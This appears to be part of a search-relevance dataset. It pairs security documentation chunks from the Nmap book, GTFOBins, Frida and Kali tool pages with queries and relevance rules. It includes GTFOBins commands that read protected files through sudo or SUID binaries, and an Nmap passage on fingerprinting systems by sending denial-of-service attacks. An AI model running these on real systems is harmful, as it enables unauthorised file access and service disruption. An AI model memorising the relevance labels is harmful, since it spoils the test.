+      "body": "Community Contributions No matter how technically advanced a service detection framework is, it would be nearly useless without a comprehensive database of services against which to match. This is where the open source nature of Nmap really shines. The Insecure.Org lab is pretty substantial by geek standards, but it can never hope to run more than a tiny percentage of machine types and services that are out there. Fortunately experience with OS detection fingerprints has shown that Nmap users together run all of the common stuff, plus a staggering array of bizarre equipment as well. The Nmap OS fingerprint database contains more than a thousand entries, including all sorts of switches, WAPs, VoIP phones, game consoles, Unix boxes, Windows hosts, printers, routers, PDAs, firewalls, etc. Version detection also supports user submissions. Nmap users have contributed thousands of services. There are three primary ways that the Nmap community helps to make this an exceptional database: submitting service fingerprints, database corrections, and new probes. Submit Service Fingerprints If a service responds to one or more of Nmap's probes and yet Nmap is unable to identify that service, Nmap prints a service fingerprint like this one: SF-Port21-TCP:V=3.40PVT16%D=9/6%Time=3F5A961C%r(NULL,3F,\"220\\x20stage\\x20F SF:TP\\x20server\\x20\\(Version\\x202\\.1WU\\(1\\)\\+SCO-2\\.6\\.1\\+-sec\\)\\x20ready\\ SF:.\\r\\n\")%r(GenericLines,81,\"220\\x20stage\\x20FTP\\x20server\\x20\\(Version\\x SF:202\\.1WU\\(1\\)\\+SCO-2\\.6\\.1\\+-sec\\)\\x20ready\\.\\r\\n500\\x20'':\\x20command\\ SF:x20not\\x20understood\\.\\r\\n500\\x20'':\\x20command\\x20not\\x20understood\\.\\ SF:r\\n\"); If you receive such a fingerprint, and are sure you know what daemon version is running on the target host, please submit the fingerprint at the URL Nmap gives you. The whole submission process is anonymous (unless you choose to provide identifying info) and should not take more than a couple minutes. If you are feeling particularly helpful, scan the system again using -d (Nmap sometimes gives longer fingerprints that way) and paste both fingerprints into the fingerprint box on the submission form. Sometimes people read the file format section and submit their own working match lines. This is OK, but please submit the service fingerprint(s) as well because existing scripts make integrating and testing them relatively easy. For those who care, the information in the fingerprint above is port number (21), protocol (TCP), Nmap version (3.40PVT16), date (September 6), Unix time in hex, and a sequence of probe responses in the form r({ <probename> }, { <responselength> }, \"{ <responsestring> }\"). Submit Database Corrections This is another easy way to help improve the database. When integrating a service fingerprint submitted for “ chargen on Windows XP ” or “ FooBar FTP server 3.9.213 ” , it is difficult to determine how general the match is. Will it also match chargen on Solaris or FooBar FTP 2.7? Since there is no good way to tell, a very specific name is used in the hope that people will report when the match needs to be generalized. The only reason the Nmap DB is so comprehensive is that thousands of users have spent a few minutes each to submit new information. If you scan a host and the service fingerprint gives an incorrect OS, version number, application name, or even service type, please let us know as described below: Upgrade to the latest Nmap (Optional) Many Linux distributions and other operating systems ship with ancient versions of Nmap. The Nmap version detection database is improved with almost every release, so check your version number by running nmap -V and then compare that to the latest available from https://nmap.org/download.html . The problem you are seeing may have already been corrected. Installing the newest version takes only a few minutes on most platforms, and is valuable regardless of whether the version detection flaw you are reporting still exists. But even if you don't have time to upgrade right now, submissions from older releases are still valuable. Be absolutely certain you know what is running Invalid “ corrections ” can corrupt the version detection DB. If you aren't certain exactly what is running on the remote machine, please find out before submitting. Generate a fingerprint Run the command nmap -O -Pn -sSV -T4 -d --version-trace -p <port> <target> , where <port> is the port running the misidentified service on the <target> host. If the service is UDP rather than TCP, substitute -sUV for -sSV . Send us your correction Now simply submit your correction to us at https://insecure.org/cgi-bin/submit.cgi?corr-service . Thanks for contributing to the Nmap community and helping to make version detection even better! Submit New Probes Suppose Nmap fails to detect a service. If it received a response to any probes at all, it should provide a fingerprint that can be submitted as described above. But what if there is no response and thus a fingerprint is not available? Create and submit your own probe! These are very welcome. The following steps describe the process. Steps for creating a new version detection probe Download the latest version of Nmap from https://nmap.org and try again. You would feel a bit silly spending time developing a new probe just to find out that it has already been added. Make sure no fingerprint is available, as it is better to recognize services using existing probes if possible than to create too many new ones. If the service does not respond to any of the existing probes, there is no other choice. Decide on a good probe string for recognizing the service. An ideal probe should elicit a response from as many instances of the service as possible, and ideally the responses should be unique enough to differentiate between them. This step is easiest if you understand the protocol very well, so consider reading the relevant RFCs and product documentation. One simple approach is to simply start a client for the given service and watch what initial handshaking is done by sniffing the network with Wireshark or tcpdump, or connecting to a listening Ncat. Once you have decided on the proper string, add the appropriate new Probe line to Nmap (see the section called “Technique Described” and the section called “ nmap-service-probes File Format” ). Do not put in any match lines at first, although a ports directive to make this new test go first against the registered ports is OK. Then scan the service with Nmap a few times. You should get a fingerprint back showing the service's response to your new probe. Send the new probe line and the fingerprints (against different machines if possible, but even a few against the same daemon helps to note differences) to the Nmap development list at < dev@nmap.org > . It will likely then be integrated into future versions of Nmap. Any details you can provide on the nature of your probe string is helpful as well. For custom services that only appear on your network, it is better to simply add them to your own nmap-service-probes rather than the global Nmap.",
+      "requests": [
+        {
+          "decision_id": "5315534ab6cc704677db-0",
+          "query": "nmap service version detection",
+          "information_need": "Determine versions of services on open ports.",
+          "rule": "Explains Nmap service/version detection."
+        }
+      ]
+    },
+    {
+      "chunk_id": "641-0",
+      "doc_id": 641,
+      "title": "Port Specification and Scan Order | Nmap Network Scanning",
+      "url": "https://nmap.org/book/man-port-specification.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 3787,
+      "body": "Port Specification and Scan Order In addition to all of the scan methods discussed previously, Nmap offers options for specifying which ports are scanned and whether the scan order is randomized or sequential. By default, Nmap scans the most common 1,000 ports for each protocol. -p <port ranges> (Only scan specified ports) This option specifies which ports you want to scan and overrides the default. Individual port numbers are OK, as are ranges separated by a hyphen (e.g. 1-1023 ). The beginning and/or end values of a range may be omitted, causing Nmap to use 1 and 65535, respectively. So you can specify -p- to scan ports from 1 through 65535. Scanning port zero is allowed if you specify it explicitly. For IP protocol scanning ( -sO ), this option specifies the protocol numbers you wish to scan for (0–255). When scanning a combination of protocols (e.g. TCP and UDP), you can specify a particular protocol by preceding the port numbers by T: for TCP, U: for UDP, S: for SCTP, or P: for IP Protocol. The qualifier lasts until you specify another qualifier. For example, the argument -p U:53,111,137,T:21-25,80,139,8080 would scan UDP ports 53, 111,and 137, as well as the listed TCP ports. Note that to scan both UDP and TCP, you have to specify -sU and at least one TCP scan type (such as -sS , -sF , or -sT ). If no protocol qualifier is given, the port numbers are added to all protocol lists. Ports can also be specified by name according to what the port is referred to in the nmap-services . You can even use the wildcards * and ? with the names. For example, to scan FTP and all ports whose names begin with “ http ” , use -p ftp,http* . Be careful about shell expansions and quote the argument to -p if unsure. Ranges of ports can be surrounded by square brackets to indicate ports inside that range that appear in nmap-services . For example, the following will scan all ports in nmap-services equal to or below 1024: -p [-1024] . Be careful with shell expansions and quote the argument to -p if unsure. --exclude-ports <port ranges> (Exclude the specified ports from scanning) This option specifies which ports you do want Nmap to exclude from scanning. The <port ranges> are specified similar to -p . For IP protocol scanning ( -sO ), this option specifies the protocol numbers you wish to exclude (0–255). When ports are asked to be excluded, they are excluded from all types of scans (i.e. they will not be scanned under any circumstances). This also includes the discovery phase. -F (Fast (limited port) scan) Specifies that you wish to scan fewer ports than the default. Normally Nmap scans the most common 1,000 ports for each scanned protocol. With -F , this is reduced to 100. Nmap needs an nmap-services file with frequency information in order to know which ports are the most common (see the section called “Well Known Port List: nmap-services ” for more about port frequencies). If port frequency information isn't available, perhaps because of the use of a custom nmap-services file, Nmap scans all named ports plus ports 1-1024. In that case, -F means to scan only ports that are named in the services file. -r (Don't randomize ports) By default, Nmap randomizes the scanned port order (except that certain commonly accessible ports are moved near the beginning for efficiency reasons). This randomization is normally desirable, but you can specify -r for sequential (sorted from lowest to highest) port scanning instead. --port-ratio <ratio> <decimal number between 0 and 1> Scans all ports in nmap-services file with a ratio greater than the one given. <ratio> must be between 0.0 and 1.0. --top-ports <n> Scans the <n> highest-ratio ports found in nmap-services file after excluding all ports specified by --exclude-ports . <n> must be 1 or greater.",
+      "requests": [
+        {
+          "decision_id": "59ef8ab2b315fa3e0a63-0",
+          "query": "nmap udp scan",
+          "information_need": "Understand scanning UDP ports.",
+          "rule": "Explains UDP scan behavior, usage or interpretation."
+        }
+      ]
+    },
+    {
+      "chunk_id": "456-0",
+      "doc_id": 456,
+      "title": "NSE Scripts | Nmap Network Scanning",
+      "url": "https://nmap.org/book/nse-scripts.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 233,
+      "body": "NSE Scripts This section (a long list of NSE scripts with brief summaries) is only provided in the printed edition of this book because we already provide a better online interface to the information at the NSE Documentation Portal .",
+      "requests": [
+        {
+          "decision_id": "a778383ffbaecaafa14d-0",
+          "query": "nmap udp scan",
+          "information_need": "Understand scanning UDP ports.",
+          "rule": "Explains UDP scan behavior, usage or interpretation."
+        }
+      ]
+    },
+    {
+      "chunk_id": "104-0",
+      "doc_id": 104,
+      "title": "apache2ctl | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/apache2ctl/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 695,
+      "body": ".. / apache2ctl File read File read This executable can read data from local files. Comment The first line only is likely leaked as an error message. Unprivileged This function can be performed by any unprivileged user. apache2ctl -c 'Include /path/to/input-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . apache2ctl -c 'Include /path/to/input-file' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.",
+      "requests": [
+        {
+          "decision_id": "d6bab68a08a71fbf9f1a-0",
+          "query": "find gtfobins sudo binary techniques",
+          "information_need": "Locate documented sudo behavior for Unix binaries.",
+          "rule": "A GTFOBins entry with a sudo function or overview of that feature."
+        }
+      ]
+    },
+    {
+      "chunk_id": "411-0",
+      "doc_id": 411,
+      "title": "Fingerprinting Methods Avoided by Nmap | Nmap Network Scanning",
+      "url": "https://nmap.org/book/osdetect-other-methods.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 7160,
+      "body": "Fingerprinting Methods Avoided by Nmap Nmap supports many more OS detection techniques than any other program, and we are always interested in hearing about new ideas. Please send them to the Nmap development list ( nmap-dev ) for discussion. However there are some methods that just aren't a good fit. This section details some of the most interesting ones. While they aren't supported by Nmap, some are useful in combination with Nmap to verify findings or learn further details. Passive Fingerprinting Passive fingerprinting uses most of the same techniques as the active fingerprinting performed by Nmap. The difference is that a passive system simply sniffs the network, opportunistically classifying hosts as it observes their traffic. This is more difficult than active fingerprinting, since you have to accept whatever communication happens rather than designing your own custom probes. It is a valuable technique, but doesn't belong in a fundamentally active tool such as Nmap. Fortunately, Michal Zalewski has written the excellent p0f passive OS fingerprinting tool. He also devised a couple of the current Nmap OS fingerprinting tests. Another option is SinFP by GomoR, which supports both active and passive fingerprinting. Exploit Chronology TCP/IP fingerprinting works well for distinguishing different operating systems, but detecting different versions of the same operating system can be troublesome. The company must change their stack in some way we can differentiate. Fortunately, many OS vendors regularly update their systems to comply with the latest standards. But what about those who don't? Most of them at least get around to fixing exploitable stack bugs eventually. And those fixes are easy to detect remotely. First send the exploit payload, be it a land attack, teardrop, ping of death, SYN flood, or WinNuke. Send one attack at a time, then immediately try to contact the system again. If it is suddenly non-responsive, you have narrowed down the OS to versions which didn't ship with the fix. Warning If you use denial of service (DoS) exploits as part of your OS detection suite, remember to perform those tests last. Retransmission Times TCP implementations have significant leeway in exactly how long they wait before retransmitting packets. The proof-of-concept tools Ring and Cron-OS are available to exploit this. They send a SYN packet to an open port, then ignore the SYN/ACK they receive rather than acknowledging it with an ACK (to complete the connection) or a RST (to kill it). The target host will resend the SYN/ACK several more times, and these tools track every subsecond of the wait. While some information can indeed be gleaned from this technique, there are several reasons that I haven't incorporated the patch into Nmap: It usually requires modifying the source host firewall rules to prevent your system from replying with a RST packet to the SYN/ACK it receives. That is hard to do in a portable way. And even if it was easy, many users don't appreciate applications mucking with their firewall rules. It can be very slow. The retransmissions can go on for several minutes. That is a long time to wait for a test that doesn't give all that much information in the first place. It can be inaccurate because packet drops and latency (which you have to expect in real-world environments) can lead to bogus results. I have enumerated these reasons here because they also apply to some other proposed OS detection methods. I would love to add new tests, but they must be quick and require few packets. Messing with host firewall is unacceptable. I try to avoid making full TCP connections for stack fingerprinting, though that is done for OS detection as part of the version scanning system. IP Fragmentation IP fragmentation is a complex system and implementations are riddled with bugs and inconsistencies. Possible tests could examine how overlapping fragments are assembled or time the defragmentation timeouts. These tests are avoided for Nmap because many firewalls and other inline devices defragment traffic at gateways. Thus Nmap may end up fingerprinting the firewall rather than the true destination host. In addition, fragments are difficult to send on some operating systems. Linux 2.6 kernels have a tendency to queue the fragments you are trying to send and assemble them itself before transmission. Open Port Patterns The target host OS can often be guessed simply by looking at the ports which are open. Microsoft Windows machines often have TCP ports 135 and 139 open. Windows 2000 and newer also listen on port 445. Meanwhile, a machine running services on port 22 (ssh) and 631 (Internet Printing Protocol) is likely running Unix. While this heuristic is often useful, it just isn't reliable enough for Nmap. Combinations of ports can be obscured by firewall rules, and most mainstream protocols are available on multiple platforms. OpenSSH servers can be run on Windows , and the “ Windows SMB ” ports can be serviced by Samba running on a Unix machine. Port forwarding clouds the issue even further. A machine which appears to be running Microsoft IIS might be a Unix firewall simply forwarding port 80 to a Windows machine. For these reasons, Nmap does not consider open port numbers during TCP/IP stack fingerprinting. However, Nmap can use version detection information (see Chapter 7, Service and Application Version Detection ) to separately discover operating system and device type information. By keeping the OS detection results discovered by OS detection and version detection separate, Nmap can gracefully handle a Checkpoint firewall which uses TCP port forwarding to a Windows web server. The stack fingerprinting results should be “ Checkpoint Firewall-1 ” while version detection should suggest that the OS is Windows. Keep in mind that only a small fraction of version detection signatures include OS and device type information—we can only populate these fields when the application divulges the information or when it only runs on one OS or device type. Retired Tests There are some tests that were once performed by Nmap, but which have been retired because they were found not to help in distinguishing operating systems and only took up space in the database. Two tests in the IE line were removed: DLI checked the length of the data payload in returned packets and SI checked the ICMP sequence numbers. They were never found to vary from the values sent. In the U1 line, the RUL test checked the length of the UDP packet returned. It was different from what was sent in only one case out of more than 1,700. These tests were removed in March 2009. Other tests were removed because they were too discriminating; they caused false differences to be measured that harmed detection accuracy. Both of these had to do with the TOS (type of service) field in responses. TOS did this for the U1 probe and TOSI did it for IE . Although the test values did legitimately differ between operating systems, often false differences were recorded because the TOS was modified by an intermediate host. Better results were had overall when these tests were removed in October 2008.",
+      "requests": [
+        {
+          "decision_id": "32f4098a056439f438b1-0",
+          "query": "nmap operating system detection",
+          "information_need": "Determine a hosts operating system with Nmap.",
+          "rule": "Explains OS fingerprinting/detection."
+        }
+      ]
+    },
+    {
+      "chunk_id": "122-0",
+      "doc_id": 122,
+      "title": "Frida CLI | Frida • A world-class dynamic instrumentation toolkit",
+      "url": "https://frida.re/docs/frida-cli/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 1963,
+      "body": "Frida CLI Frida CLI is a REPL interface that aims to emulate a lot of the nice features of IPython (or Cycript), which tries to get you closer to your code for rapid prototyping and easy debugging. # Connect Frida to an iPad over USB and start debugging Safari $ frida -U Safari [ USB::iPad 4::Safari]-> An example session # Connect Frida to a locally-running Calculator.app $ frida Calculator # Look at the local variables/context [ Local::ProcName::Calculator]-> <TAB> Backtracer Process CpuContext Proxy Dalvik Socket DebugSymbol Stalker File Thread Frida WeakRef Instruction clearInterval Interceptor clearTimeout Memory console MemoryAccessMonitor gc Module ptr NULL recv NativeCallback send NativeFunction setInterval NativePointer setTimeout ObjC # Look at things exposed through the ObjC interface [ Local::ProcName::Calculator]-> ObjC.<TAB> Object implement selector available mainQueue selectorAsString classes schedule # List the first 10 classes (there are a lot of them!) [ Local::...::Calculator]-> Object.keys ( ObjC.classes ) .slice ( 0, 10 ) [ \"NSDrawer\" , \"GEOPDETAFilter\" , \"NSDeserializer\" , \"CBMutableCharacteristic\" , \"NSOrthographyCheckingResult\" , \"DDVariable\" , \"GEOVoltaireLocationShiftProvider\" , \"LSDocumentProxy\" , \"NSPreferencesModule\" , \"CIQRCodeGenerator\" ] Loading a script # Connect Frida to a locally-running Calculator.app and load calc.js $ frida Calculator -l calc.js # The code in calc.js has now been loaded and executed. Any changes will be reloaded automatically [ Local::ProcName::Calculator]-> # Manually reload it from file at any time [ Local::ProcName::Calculator]-> %reload [ Local::ProcName::Calculator]-> Enable the Node.js compatible debugger # Connect Frida to a locally-running Calculator.app # and load calc.js with the debugger enabled $ frida Calculator -l calc.js --debug Debugger listening on port 5858 # We can now run node-inspector and start debugging calc.js [ Local::ProcName::Calculator]-> Back Next",
+      "requests": [
+        {
+          "decision_id": "3f4ae8963a31afab0a14-0",
+          "query": "frida attach running process",
+          "information_need": "Instrument an already running process with Frida.",
+          "rule": "Explains attaching, process selection or attach workflows."
+        }
+      ]
+    },
+    {
+      "chunk_id": "390-0",
+      "doc_id": 390,
+      "title": "cat | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/cat/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 638,
+      "body": ".. / cat File read File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. cat /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . cat /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. cat /path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "fb222f4b3607bc732fcc-0",
+          "query": "find gtfobins sudo binary techniques",
+          "information_need": "Locate documented sudo behavior for Unix binaries.",
+          "rule": "A GTFOBins entry with a sudo function or overview of that feature."
+        }
+      ]
+    },
+    {
+      "chunk_id": "129-0",
+      "doc_id": 129,
+      "title": "frida-ps | Frida • A world-class dynamic instrumentation toolkit",
+      "url": "https://frida.re/docs/frida-ps/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 419,
+      "body": "frida-ps This is a command-line tool for listing processes, which is very useful when interacting with a remote system. You can acquire device id from frida-ls-devices tool. # Connect Frida to an iPad over USB and list running processes $ frida-ps -U # List running applications $ frida-ps -Ua # List installed applications $ frida-ps -Uai # Connect Frida to the specific device $ frida-ps -D 0216027d1d6d3a03 Back Next",
+      "requests": [
+        {
+          "decision_id": "2753e768b18b9e16b99e-0",
+          "query": "frida attach running process",
+          "information_need": "Instrument an already running process with Frida.",
+          "rule": "Explains attaching, process selection or attach workflows."
+        },
+        {
+          "decision_id": "cb28aeef0854c1aecf94-0",
+          "query": "android dynamic instrumentation",
+          "information_need": "Inspect a running Android app with instrumentation.",
+          "rule": "Documents Frida Android instrumentation, attachment or hooks."
+        }
+      ]
+    },
+    {
+      "chunk_id": "845-0",
+      "doc_id": 845,
+      "title": "siparmyknife | Kali Linux Tools",
+      "url": "https://www.kali.org/tools/siparmyknife/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 440,
+      "body": "Packages and Binaries: siparmyknife SIP fuzzing tool SIP Army Knife is a fuzzer that searches for cross site scripting, SQL injection, log injection, format strings, buffer overflows, and more. Installed size: 31 KB How to install: sudo apt install siparmyknife Dependencies: libdigest-crc-perl libdigest-md4-perl libio-socket-ip-perl libsocket-perl perl siparmyknife root@kali:~# siparmyknife --help THIS IS THERE TO PUT THE HELP REFERENCE",
+      "requests": [
+        {
+          "decision_id": "111ad6960ff9b7429a1d-0",
+          "query": "detect sql injection automatically",
+          "information_need": "Find a tool for automated SQL injection detection.",
+          "rule": "Documents an automated SQLi detection/exploitation tool, not a generic library mention."
+        },
+        {
+          "decision_id": "2638e0089a492b126e59-0",
+          "query": "sql injection tool",
+          "information_need": "User wants a tool to find/exploit SQL injection.",
+          "rule": "A user-operable tool explicitly documenting SQLi detection or exploitation is relevant, including an explicitly SQLi-capable SIP fuzzer; API-only library or post-exploitation files alone are insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "949-0",
+      "doc_id": 949,
+      "title": "ssdeep | Kali Linux Tools",
+      "url": "https://www.kali.org/tools/ssdeep/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 3031,
+      "body": "Packages and Binaries: libfuzzy-dev Recursive piecewise hashing tool (development headers) ssdeep is a tool for recursive computing and matching of Context Triggered Piecewise Hashing (aka Fuzzy Hashing). Fuzzy hashing is a method for comparing similar but not identical files. This tool can be used to compare files like regular hashing does (like md5sum or sha1sum) but it will find similar files with little differences. For example, it can be used to identify modified versions of known files even if data has been inserted, modified, or deleted in the new files. This package contains the developments files. Installed size: 61 KB How to install: sudo apt install libfuzzy-dev Dependencies: libfuzzy2 libfuzzy2 Recursive piecewise hashing tool (library) ssdeep is a tool for recursive computing and matching of Context Triggered Piecewise Hashing (aka Fuzzy Hashing). Fuzzy hashing is a method for comparing similar but not identical files. This tool can be used to compare files like regular hashing does (like md5sum or sha1sum) but it will find similar files with little differences. For example, it can be used to identify modified versions of known files even if data has been inserted, modified, or deleted in the new files. This package contains the library. Installed size: 50 KB How to install: sudo apt install libfuzzy2 Dependencies: libc6 ssdeep Recursive piecewise hashing tool ssdeep is a tool for recursive computing and matching of Context Triggered Piecewise Hashing (aka Fuzzy Hashing). Fuzzy hashing is a method for comparing similar but not identical files. This tool can be used to compare files like regular hashing does (like md5sum or sha1sum) but it will find similar files with little differences. For example, it can be used to identify modified versions of known files even if data has been inserted, modified, or deleted in the new files. This package is useful in forensics investigations. Installed size: 83 KB How to install: sudo apt install ssdeep Dependencies: libc6 libgcc-s1 libstdc++6 ssdeep Computes context triggered piecewise hashes (fuzzy hashes) root@kali:~# ssdeep -h ssdeep version 2.14.1 by Jesse Kornblum and the ssdeep Project For copyright information, see man page or README.TXT. Usage: ssdeep [-m file] [-k file] [-dpgvrsblcxa] [-t val] [-h|-V] [FILES] -m - Match FILES against known hashes in file -k - Match signatures in FILES against signatures in file -d - Directory mode, compare all files in a directory -p - Pretty matching mode. Similar to -d but includes all matches -g - Cluster matches together -v - Verbose mode. Displays filename as its being processed -r - Recursive mode -s - Silent mode; all errors are suppressed -b - Uses only the bare name of files; all path information omitted -l - Uses relative paths for filenames -c - Prints output in CSV format -x - Compare FILES as signature files -a - Display all matches, regardless of score -t - Only displays matches above the given threshold -h - Display this help message -V - Display version number and exit",
+      "requests": [
+        {
+          "decision_id": "7f400ceead094d77920a-0",
+          "query": "identify password hash format",
+          "information_need": "Determine what kind of password hash a value uses.",
+          "rule": "Documents hash identification, not only password cracking."
+        },
+        {
+          "decision_id": "c201e630193a813576a4-0",
+          "query": "recursive web directory discovery",
+          "information_need": "Discover nested directories on a web server.",
+          "rule": "Explains recursive web directory/content discovery."
+        }
+      ]
+    }
+  ]
+}
